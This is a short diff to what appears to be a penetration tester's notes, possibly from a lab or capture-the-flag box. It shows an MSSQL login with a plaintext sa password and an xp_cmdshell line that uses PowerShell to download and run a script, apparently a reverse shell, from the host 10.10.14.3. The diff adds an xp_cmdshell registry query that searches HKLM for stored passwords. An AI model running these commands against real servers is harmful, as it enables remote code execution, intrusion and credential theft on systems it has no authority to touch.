@@ -83,6 +83,8 @@ python3 mssqlclient.py sa:EjectFrailtyThorn425@192.168.130.70 -p 1435
 # MSSQL
 ```
 SQL> xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://10.10.14.3:8000/rv.ps1\")
+FIND PASSWORDS
+xp_cmdshell "reg query HKLM /f pass /t REG_SZ /s"
 ```
 
 
